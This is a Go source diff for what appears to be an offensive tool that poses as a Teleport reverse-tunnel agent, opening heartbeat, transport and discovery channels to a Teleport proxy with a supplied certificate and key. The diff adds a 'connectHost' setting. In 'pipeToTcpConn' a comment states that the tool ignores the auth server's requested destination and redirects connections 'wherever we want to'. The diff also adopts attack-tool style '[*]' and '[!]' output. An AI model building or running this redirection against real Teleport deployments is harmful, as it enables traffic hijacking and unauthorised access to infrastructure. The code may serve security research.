@@ -14,17 +14,17 @@ import (
 )
 
 type SSHReverseTunnel struct {
-	target   string
-	username string
-	port     int
-	cert     string
-	key      string
+	target      string
+	username    string
+	connectHost string
+	cert        string
+	key         string
 }
 
-func startSSHOutboundHeartbeat(sshConn ssh.Conn) {
+func (s *SSHReverseTunnel) startSSHOutboundHeartbeat(sshConn ssh.Conn) {
 	ch, req, err := sshConn.OpenChannel("teleport-heartbeat", nil)
 	if err != nil {
-		log.Fatalf("failed to open channel: %v", err)
+		fmt.Printf("[!] failed to open channel: %v\n", err)
 		os.Exit(1)
 	}
 
@@ -46,11 +46,11 @@ func startSSHOutboundHeartbeat(sshConn ssh.Conn) {
 	}()
 }
 
-func startSSHOutboundTransport(target string, sshConn ssh.Conn) (net.Conn, error) {
+func (s *SSHReverseTunnel) startSSHOutboundTransport(target string, sshConn ssh.Conn) (net.Conn, error) {
 
 	transportChannel, transportOOBRequests, err := sshConn.OpenChannel("teleport-transport", nil)
 	if err != nil {
-		log.Fatalf("failed to open channel: %v", err)
+		fmt.Printf("[!] failed to open channel: %v\n", err)
 		os.Exit(1)
 	}
 
@@ -69,21 +69,21 @@ func startSSHOutboundTransport(target string, sshConn ssh.Conn) (net.Conn, error
 	// Send a request with our connection info
 	ok, err := transportChannel.SendRequest("teleport-transport-dial", true, dialInfo)
 	if err != nil {
-		log.Fatalf("failed to send request: %v", err)
+		fmt.Printf("[!] failed to send request: %v\n", err)
 		return nil, err
 	}
 
 	if !ok {
-		log.Fatalf("teleport-transport-dial request denied")
+		fmt.Printf("[!] teleport-transport-dial request denied\n")
 		errMessageBytes, _ := io.ReadAll(transportChannel.Stderr())
 		errMessage := string(bytes.TrimSpace(errMessageBytes))
 		if errMessage != "" {
-			log.Fatalf("error from server: %s", errMessage)
+			fmt.Printf("[!] error from server: %s\n", errMessage)
 		}
 		os.Exit(1)
 	}
 
-	log.Printf("teleport-transport-dial request sent")
+	fmt.Printf("[*] teleport-transport-dial request sent\n")
 
 	pipeIn, pipeOut := net.Pipe()
 	go func() {
@@ -108,10 +108,10 @@ func DiscardChannelData(ch ChannelReadWriter) {
 	go io.Copy(io.Discard, ch.Stderr())
 }
 
-func handleIncomingTeleportDiscoveryChannels(newChannel ssh.NewChannel) {
+func (s *SSHReverseTunnel) handleIncomingTeleportDiscoveryChannels(newChannel ssh.NewChannel) {
 	discoveryChannel, discoveryOOBRequests, err := newChannel.Accept()
 	if err != nil {
-		log.Printf("failed to accept teleport-discovery channel: %v", err)
+		fmt.Printf("[!] failed to accept teleport-discovery channel: %v\n", err)
 		return
 	}
 
@@ -119,20 +119,25 @@ func handleIncomingTeleportDiscoveryChannels(newChannel ssh.NewChannel) {
 
 	go func() {
 		for req := range discoveryOOBRequests {
-			log.Printf("Received request on teleport-discovery channel: %s", req.Type)
-			log.Printf("Payload: %s", string(req.Payload))
+			fmt.Printf("[*] Received request on teleport-discovery channel: %s\n", req.Type)
+			fmt.Printf("[*] Payload: %s\n", string(req.Payload))
 		}
 	}()
 }
 
-func pipeToTcpConn(hostname string, conn ssh.Channel) {
+func (s *SSHReverseTunnel) pipeToTcpConn(hostname string, conn ssh.Channel) {
+	// On input here, hostname contains the request from the auth-server on where to connect to
+	// However, this tool is going to ignore it and instead redirect to wherever we want to...
+
 	//if hostname == "@local-node" {
-	hostname = fmt.Sprintf("localhost:%d", 23)
+	//hostname = fmt.Sprintf("localhost:%d", 23)
 	//}
+	//
+	hostname = s.connectHost
 
 	tcpConn, err := net.Dial("tcp", hostname)
 	if err != nil {
-		log.Printf("failed to dial tcp connection to %s: %v", hostname, err)
+		fmt.Printf("[!] failed to dial tcp connection to %s: %v\n", hostname, err)
 		return
 	}
 	//defer tcpConn.Close()
@@ -150,10 +155,10 @@ func pipeToTcpConn(hostname string, conn ssh.Channel) {
 
 }
 
-func handleIncomingTeleportTransportChannels(newChannel ssh.NewChannel) {
+func (s *SSHReverseTunnel) handleIncomingTeleportTransportChannels(newChannel ssh.NewChannel) {
 	transportChannel, transportOOBRequests, err := newChannel.Accept()
 	if err != nil {
-		log.Printf("failed to accept teleport-transport channel: %v", err)
+		fmt.Printf("[!] failed to accept teleport-transport channel: %v\n", err)
 		return
 	}
 
@@ -161,33 +166,33 @@ func handleIncomingTeleportTransportChannels(newChannel ssh.NewChannel) {
 
 	go func() {
 		for req := range transportOOBRequests {
-			log.Printf("Received request on teleport-transport channel: %s", req.Type)
+			fmt.Printf("[!] Received request on teleport-transport channel: %s\n", req.Type)
 			switch req.Type {
 			case "teleport-transport-dial":
-				log.Printf("Payload: %s", string(req.Payload))
+				fmt.Printf("[*] Payload: %s\n", string(req.Payload))
 				go func() {
-					pipeToTcpConn(string(req.Payload), transportChannel)
+					s.pipeToTcpConn(string(req.Payload), transportChannel)
 				}()
 				req.Reply(true, nil)
 			default:
-				log.Printf("Unknown request type: %s", req.Type)
+				log.Printf("[!] Unknown request type: %s\n", req.Type)
 			}
 		}
 	}()
 }
 
-func handleNewIncomingChannels(newInboundChannels <-chan ssh.NewChannel) {
+func (s *SSHReverseTunnel) handleNewIncomingChannels(newInboundChannels <-chan ssh.NewChannel) {
 	go func() {
 		for newChannel := range newInboundChannels {
-			log.Printf("New channel requested: %v", newChannel.ChannelType())
+			fmt.Printf("[*] New channel requested: %v\n", newChannel.ChannelType())
 
 			switch newChannel.ChannelType() {
 			case "teleport-discovery":
-				handleIncomingTeleportDiscoveryChannels(newChannel)
+				s.handleIncomingTeleportDiscoveryChannels(newChannel)
 			case "teleport-transport":
-				handleIncomingTeleportTransportChannels(newChannel)
+				s.handleIncomingTeleportTransportChannels(newChannel)
 			default:
-				log.Printf("Unknown channel type: %s", newChannel.ChannelType())
+				fmt.Printf("[!] Unknown channel type: %s\n", newChannel.ChannelType())
 			}
 		}
 	}()
@@ -236,11 +241,11 @@ func (s *SSHReverseTunnel) Connect(conn net.Conn) error {
 	go ssh.DiscardRequests(oobRequest)
 
 	// Handle inbound channels
-	handleNewIncomingChannels(newInboundChannels)
+	s.handleNewIncomingChannels(newInboundChannels)
 
 	// Handle outbound channels
-	startSSHOutboundHeartbeat(sshConn)
-	_, err = startSSHOutboundTransport(s.target, sshConn)
+	s.startSSHOutboundHeartbeat(sshConn)
+	_, err = s.startSSHOutboundTransport(s.target, sshConn)
 	if err != nil {
 		return err
 	}
@@ -248,12 +253,12 @@ func (s *SSHReverseTunnel) Connect(conn net.Conn) error {
 	return nil
 }
 
-func New(username string, target string, port int, certificatePath string, keyPath string) *SSHReverseTunnel {
+func New(username string, target string, connectHost string, certificatePath string, keyPath string) *SSHReverseTunnel {
 	return &SSHReverseTunnel{
-		target:   target,
-		username: username,
-		port:     port,
-		cert:     certificatePath,
-		key:      keyPath,
+		target:      target,
+		username:    username,
+		connectHost: connectHost,
+		cert:        certificatePath,
+		key:         keyPath,
 	}
 }
